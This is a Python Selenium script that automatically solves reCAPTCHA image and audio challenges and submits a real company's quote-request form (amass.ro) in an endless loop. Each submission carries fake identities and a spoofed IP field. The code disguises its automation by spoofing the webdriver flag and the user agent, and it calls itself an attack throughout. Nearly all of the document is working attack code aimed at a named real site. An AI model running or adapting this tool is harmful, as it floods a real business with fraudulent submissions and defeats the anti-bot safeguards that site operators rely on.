from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium import webdriver
from bs4 import BeautifulSoup
from random import uniform
from time import sleep
from faker import Faker
from scipy.io import wavfile

import sys
import datetime
import logging
import logging.config
import random
import os
import urllib.request
import time
import audio
import threading
import argparse
import uuid
import math
import image
import ris

# use the max amplitude to filter out pauses
AMP_THRESHOLD = 2500
ATTACK_AUDIO = True
ATTACK_IMAGES = False
CHROMEDRIVER_PATH = "chromedriver.exe"

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("--image", action='store_true', help="attack image recaptcha")
group.add_argument("--audio", action='store_true', help="attack audio recaptcha")
parser.add_argument("--driver", action="store", help="specify custom chromedriver path")

args = parser.parse_args()
ATTACK_IMAGES = args.image
ATTACK_AUDIO = args.audio
CHROMEDRIVER_PATH = args.driver

logging.config.fileConfig('logging.conf')
# create logger
logger = logging.getLogger('file')

if not ATTACK_AUDIO and not ATTACK_IMAGES:
    parser.print_help()
    sys.exit()

    
############################## UTIL FUNCTIONS #############################
def init(task_type):
    global TASK_PATH, TASK_DIR, TASK_NUM, TASK
    TASK_DIR = os.path.join(task_type, "task")
    TASK_NUM = 1

    while os.path.isdir(TASK_DIR+str(TASK_NUM)):
        TASK_NUM += 1
    if not os.path.isdir(TASK_DIR+str(TASK_NUM)):
        os.mkdir(TASK_DIR+str(TASK_NUM))
        logger.info("Making "+ TASK_DIR+str(TASK_NUM))
    TASK = "task"+str(TASK_NUM)
    TASK_PATH = os.path.join(task_type, TASK)


def wait_between(a, b):
    rand = uniform(a, b)
    sleep(rand)


############################## IMAGE RECAPTCHA ##############################
CAPTCHA_PATH = "images\\captchas"
TASK_PATH = "images\\taskg"
CLASSIFIER_PATH = "images\\classifier"
def should_click_image(img, x, y, store, classifier):
    # ans = ris.parse_clarifai(ris.clarifai(img))
    ans = image.predict(os.path.abspath(img), x, y)

    if classifier.lower() == "chimneys":
        if "Roof" in ans:
            return store_in_dict(img, x, y, store, classifier)

    if classifier.lower() == "stairs":
        if "Staircase" in ans:
            return store_in_dict(img, x, y, store, classifier)

    if classifier.lower() == "store front":
        if "Housing" in ans or "Building" in ans or "Architecture" in ans or "City" in ans or "Town" in ans or "Urban" in ans:
            return store_in_dict(img, x, y, store, classifier)

    if classifier.lower() == "crosswalks":
        if "Zebra Crossing" in ans or "Intersection" in ans or "Path" in ans:
            return store_in_dict(img, x, y, store, classifier)

    words = classifier.split(' ')
    for elem in ans:
        for word in words:
            if len(word) > 2 and (word.lower() in elem.lower() or elem.lower() in word.lower()):
                return store_in_dict(img, x, y, store, classifier)

    return False

def store_in_dict(img, x, y, store, classifier):
    store[(x,y)] = True
    logger.debug(store)

    path = CLASSIFIER_PATH+"\\"+classifier.replace(' ', '_')
    os.makedirs(path, exist_ok=True)
    os.system("mv "+img+" "+path+"\\"+str(uuid.uuid1())+".jpeg")
    return True

def trigger_click(element):
    if element.get_attribute("style") != "display: none":
        element.click()
        wait_between(0.1, 0.5)
        return True


def click_tiles(driver, coords):
    orig_srcs, new_srcs = {}, {}
    is_click = False
    for (x, y) in coords:
        logger.debug("[*] Going to click {} {}".format(x,y))
        tile = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//*[@id=\"rc-imageselect-target\"]/table/tbody/tr[{}]/td[{}]".format(x, y))))
        orig_srcs[(x, y)] = driver.find_element(By.XPATH, "//*[@id=\"rc-imageselect-target\"]/table/tbody/tr[{}]/td[{}]/div/div[1]/img".format(x,y)).get_attribute("src")
        new_srcs[(x, y)] = orig_srcs[(x, y)] # to check if image has changed
        tile.click()
        wait_between(0.1, 0.5)

    logger.debug("Downloading new inbound image...")
    new_files = {}
    for (x, y) in orig_srcs:

        count = 0
        while new_srcs[(x, y)] == orig_srcs[(x, y)] and count < 10:
            new_srcs[(x, y)] = driver.find_element(By.XPATH, "//*[@id=\"rc-imageselect-target\"]/table/tbody/tr[{}]/td[{}]/div/div[1]/img".format(x, y)).get_attribute("src")
            sleep(0.2)
            count += 1

        if new_srcs[(x, y)] != orig_srcs[(x, y)]:
            urllib.request.urlretrieve(new_srcs[(x, y)], "captcha.jpeg")
            new_path = TASK_PATH+"\\new_output{}{}.jpeg".format(x, y)
            os.system("mv captcha.jpeg "+new_path)
            new_files[(x, y)] = (new_path)

    return new_files

def handle_queue(to_solve_queue, coor_dict, classifier):
    ts = []
    for (x,y) in to_solve_queue:
        image_file = to_solve_queue[(x, y)]
        t = threading.Thread(target=should_click_image, args=(image_file, x, y,coor_dict, classifier))
        ts.append(t)
        t.start()
    for t in ts:
        t.join()
    return len(ts)

def cleanup():
    for root, dirs, files in os.walk(TASK_PATH):
        for file in files:
            os.remove(os.path.join(root, file))

def image_recaptcha(driver, iframe):
    continue_solving = True
    while continue_solving:
        cleanup()
        sleep(2)

        body = driver.find_element(By.CSS_SELECTOR, "body").get_attribute('innerHTML').encode("utf8")
        soup = BeautifulSoup(body, 'html.parser')
        table = soup.findAll("div", {"id": "rc-imageselect-target"})[0]
        target = soup.findAll("div", {"class": "rc-imageselect-desc"})
        if not target: # find the target
            target = soup.findAll("div", {"class": "rc-imageselect-desc-no-canonical"})
        target = target[0].findAll("strong")[0].get_text()
        logger.debug ("Classifier is: " + target);

        #  Compute shape of captcha & target  #
        trs = table.findAll("tr")
        max_height = len(trs)
        max_width = 0
        for tr in trs:
            imgs = tr.findAll("img")
            payload = imgs[0]["src"]
            if len(imgs) > max_width:
                max_width = len(imgs)

        #  Pull down captcha to attack and organize directory structure
        urllib.request.urlretrieve(payload, "captcha.jpeg")
        os.system("mv captcha.jpeg "+TASK_PATH+"/full_payload.jpeg")
        os.system("copy "+TASK_PATH+"\\full_payload.jpeg "+CAPTCHA_PATH)
        os.rename(CAPTCHA_PATH+"/full_payload.jpeg", CAPTCHA_PATH+"/"+str(uuid.uuid1())+".jpeg")
        os.system("magick "+TASK_PATH+"/full_payload.jpeg -crop "+str(max_width)+"x"+str(max_height)+"@ +repage +adjoin "+TASK_PATH+"/output_%03d.jpg")

        #  build queue of files
        to_solve_queue = {}

        idx = 0
        files = [TASK_PATH+"\\"+f for f in os.listdir(TASK_PATH) if "output_" in f]
        for f in files:
            x = math.floor(idx / max_width + 1)
            y = math.floor(idx % max_width + 1)
            to_solve_queue[(x, y)] = f
            idx += 1

        coor_dict = {}
        handle_queue(to_solve_queue, coor_dict, target)  # multithread builds out where to click
        logger.debug(coor_dict)
        #os.system("rm "+TASK_PATH+"/full_payload.jpeg")

        driver.switch_to.default_content()
        iframe = driver.find_element(By.XPATH, "/html/body/div/div[4]/iframe")
        driver.switch_to.frame(iframe)

        resolve = True
        while resolve:
            to_click_tiles = []
            for coords in coor_dict:
                to_click = coor_dict[coords]
                x, y = coords
                if to_click:
                    to_click_tiles.append((x,y)) # collect all the tiles to click in this round

            try:
                new_files = click_tiles(driver, to_click_tiles)
                for (x,y) in coor_dict:
                    coor_dict[(x,y)] = False
                count = handle_queue(new_files, coor_dict, target)
                logger.debug ("Found " + str(count) + " new files!")

                if count == 0:
                    resolve = False

                    #click on button
                    error_select_more = driver.find_element_by_class_name("rc-imageselect-error-select-more")
                    error_dynamic_more = driver.find_element_by_class_name("rc-imageselect-error-dynamic-more")

                    if error_select_more.get_attribute("style") == "display: none;" or error_dynamic_more.get_attribute("style") == "display: none;":
                        button = driver.find_element(By.ID, "recaptcha-verify-button")
                        logger.debug ("Click on " + button.text)
                        button.click()
                        wait_between(0.2, 0.5)

                    #verify if more items need to be selected and select more if needed
                    if error_select_more.get_attribute("style") != "display: none;" or error_dynamic_more.get_attribute("style") != "display: none;":
                        resolve = True
                        idx = 0

                        #we click more items so that we can go next
                        new_coor_dict = {}
                        for i in range(max_height):
                            for j in range(max_width):
                                if idx < 2:
                                    try:
                                        print(coor_dict[(i+1, j+1)])
                                    except:
                                        new_coor_dict[(i+1, j+1)] = True
                                        idx += 1

                        #we do not want to click again on already clicked items so that we'll reinitialize list with new items
                        coor_dict = new_coor_dict

                        #click on button
                        button = driver.find_element(By.ID, "recaptcha-verify-button")
                        logger.debug ("Click on " + button.text)
                        button.click()
                        wait_between(0.2, 0.5)
            except Exception as e:
                resolve = False
                print(e)

        driver.switch_to.default_content()
        captcha_response = driver.find_element(By.ID, "g-recaptcha-response")
        captcha_response_value = captcha_response.get_attribute("value")
        if captcha_response_value != "":
            logger.debug("Captcha Response:" + captcha_response_value)
            continue_solving = False

        driver.switch_to.frame(iframe)


############################## AUDIO RECAPTCHA ##############################
def test_all(start=100, end=101):
    global TASK_PATH
    TASK_TYPE = "data"
    timings = []
    for task_num in range(start, end):
        try:
            TASK = "task"+str(task_num)
            TASK_PATH = TASK_TYPE+"/"+TASK
            AUDIO_FILE = TASK_PATH+"/"+TASK #+ ".mp3"
            num_str, time = get_numbers(AUDIO_FILE, TASK_PATH+"/")
            print(num_str, time)
            timings.append(time)
        except:
            pass
    print (timings)
    print (sum(timings)/float(len(timings)))

def get_numbers(audio_file, parent_dir):
    global AMP_THRESHOLD
    mp3_file = audio_file + ".mp3"
    wav_file = audio_file + ".wav"
    print("converting from " + mp3_file + " to " + wav_file)
    os.system("echo 'y' | ffmpeg -i "+mp3_file+" "+wav_file + "&> /dev/null")
    # split audio file on silence
    os.system("sox -V3 "+wav_file+" "+audio_file+"_.wav silence -l 0 1 0.5 0.1% : newfile : restart &> /dev/null")
    files = [f for f in os.listdir(parent_dir) if "_0" in f]
    audio_filenames = []
    # remove audio files that are only silence
    for f in files:
        _, snd = wavfile.read(TASK_PATH + "/" + f)
        amp = max(snd)
        print(f + ":" + str(amp))
        if amp > AMP_THRESHOLD: # skip this file
            audio_filenames.append(parent_dir+f)
        else:
            os.system("rm " + parent_dir+f)
    # run speech recognition on the individual numbers
    # num_str = ""
    # for f in sorted(audio_filenames):
    #     print f
    #     num_str += str(audio.getNum(f))
    # print(num_str)
    return audio.getNums(TASK_PATH, audio_filenames)

def type_like_bot(driver, element, string):
    driver.find_element(By.ID, element).send_keys(string)
    wait_between(0.5, 2)

def type_like_human(driver, element, string):
    driver.find_element(By.ID, element).click()
    for c in string:
        driver.find_element(By.ID, element).send_keys(c)
        wait_between(0.0, 0.1)
    wait_between(0.5, 2)

type_style = type_like_bot

def fill_out_ip(driver, fake):
    random_ip = fake.ipv4_public()
    ip = driver.find_element(By.ID, "ip")
    driver.execute_script("arguments[0].value = '" + random_ip + "'", ip)
    logger.debug("IP is: " + random_ip)

def fill_out_profile(driver):
    fake = Faker("de_DE")

    user = fake.simple_profile()
    email = user["mail"].replace("@", str(random.randint(0, 40))+"@")

    wait_between(1, 2)
    type_style(driver, "nume", fake.first_name())
    type_style(driver, "prenume", fake.last_name())
    type_style(driver, "oras", fake.city())
    type_style(driver, "telefon", fake.phone_number())
    type_style(driver, "email", email)
    type_like_bot(driver, "mesaj", fake.text())

    fill_out_ip(driver, fake)

def fill_out_offer(driver):
    fake = Faker("de_DE")

    user = fake.simple_profile()
    email = user["mail"].replace("@", str(random.randint(0, 40))+"@")

    wait_between(1, 2)
    type_style(driver, "nume", fake.first_name())
    type_style(driver, "prenume", fake.last_name())
    type_style(driver, "telefon", fake.phone_number())
    type_style(driver, "email", email)
    type_style(driver, "suprafata", random.randint(50, 500))
    type_style(driver, "localitate", fake.city())
    type_like_bot(driver, "alte_sp", fake.text())

    fill_out_ip(driver, fake)

def init_driver(idx):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--disable-bundled-ppapi-flash")
    #chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--disable-plugins-discovery")
    chrome_options.add_argument("--no-sandbox")

    #avoid detection of automated control
    chrome_options.add_experimental_option('excludeSwitches', ['test-type', 'enable-automation', 'load-extension'])
    chrome_options.add_argument("user-data-dir=d:\\tmp\\customer" + str(idx))
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")

    if CHROMEDRIVER_PATH:
        driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=chrome_options)
        logger.debug("Starting custom chromedriver %s" % CHROMEDRIVER_PATH)
    else:
        driver = webdriver.Chrome(chrome_options=chrome_options)
        logger.debug("Starting system default chromedriver")

    return driver


def main(idx):

    #Initiate attack in an infinite loop
    submitted = 0
    avg = 0
    while True:

        try:
            success = True
            start_time = datetime.datetime.now()

            driver = init_driver(idx)

            agent = driver.execute_script("return navigator.userAgent")
            logger.debug("Starting driver with user agent %s" % agent)

            #driver.get("https://www.amass.ro/contact.html")
            driver.get("https://www.amass.ro/cere-o-cotatie-pentru-incalzirea-electrica")
            driver.delete_all_cookies()

            #avoid detection of automated control
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false,})")
            wait_between(1, 4)

            logger.debug("Filling out form")
            #fill_out_profile(driver)
            fill_out_offer(driver)

            #scroll to end of form
            submit = driver.find_element(By.ID, "send-message")
            driver.execute_script("arguments[0].scrollIntoView();", submit)

            #WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")))
            #iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")
            WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/div/iframe")))
            iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/div/iframe")
            driver.switch_to.frame(iframeSwitch)

            logger.info("Recaptcha located. Engaging")
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-anchor")))
            ele = driver.find_element(By.ID, "recaptcha-anchor")
            ele.click()
            driver.switch_to.default_content()

            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")))
            iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
            driver.switch_to.frame(iframe)
            WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "rc-imageselect")))

            if ATTACK_IMAGES:
                image_recaptcha(driver, iframe)

                driver.execute_script("window.sessionStorage.setItem('accesstime', new Date().getTime())")

                driver.switch_to.default_content()
                driver.execute_script("arguments[0].scrollIntoView();", submit)
                wait_between(3, 5)
                submit.click()

                submitted += 1
                wait_between(2, 5)

            elif ATTACK_AUDIO:
                WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-audio-button")))
                time.sleep(1)
                driver.find_element(By.ID, "recaptcha-audio-button").click()

                guess_again = True

                while guess_again:
                    init("audio")
                    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "audio-source")))
                    # Parse table details offline
                    body = driver.find_element(By.CSS_SELECTOR, "body").get_attribute('innerHTML').encode("utf8")
                    soup = BeautifulSoup(body, 'html.parser')
                    link = soup.findAll("a", {"class": "rc-audiochallenge-tdownload-link"})[0]
                    urllib.request.urlretrieve(link["href"], TASK_PATH + "/" + TASK + ".mp3")
                    guess_str = get_numbers(TASK_PATH + "/" + TASK, TASK_PATH + "/")
                    type_style(driver, "audio-response", guess_str)
                    # results.append(guess_str)
                    wait_between(0.5, 3)
                    driver.find_element(By.ID, "recaptcha-verify-button").click()
                    wait_between(1, 2.5)
                    try:
                        logger.debug("Checking if Google wants us to solve more...")
                        driver.switch_to.default_content()
                        driver.switch_to.frame(iframeSwitch)
                        checkmark_pos = driver.find_element(By.CLASS_NAME, "recaptcha-checkbox-checkmark").get_attribute("style")
                        guess_again = not (checkmark_pos == "background-position: 0 -600px")
                        driver.switch_to.default_content()
                        iframe = driver.find_element(By.CSS_SELECTOR, "iframe[title=\"recaptcha challenge\"]")
                        driver.switch_to.frame(iframe)
                    except Exception as e:
                        print (e)
                        guess_again = False

        except Exception as e:
            print(e)
            success = False

        finally:
            driver.quit()

            if success:
                end_time= datetime.datetime.now()
                delta = end_time - start_time

                logger.debug("--- Submitted " + str(submitted) + " times! ---")
                logger.debug("--- Took " + str(delta.total_seconds()) + " seconds!")

                avg += delta.total_seconds()
                logger.debug("--- Average time is " + str(avg / submitted) + " seconds!")

main(1)
# test_all()


# if __name__ == '__main__':
#
#     submitted = 0
#     avg = 0
#
#     for i in range(5):
#         t = threading.Thread(target=main, args=[i, submitted, avg])
#         t.start()
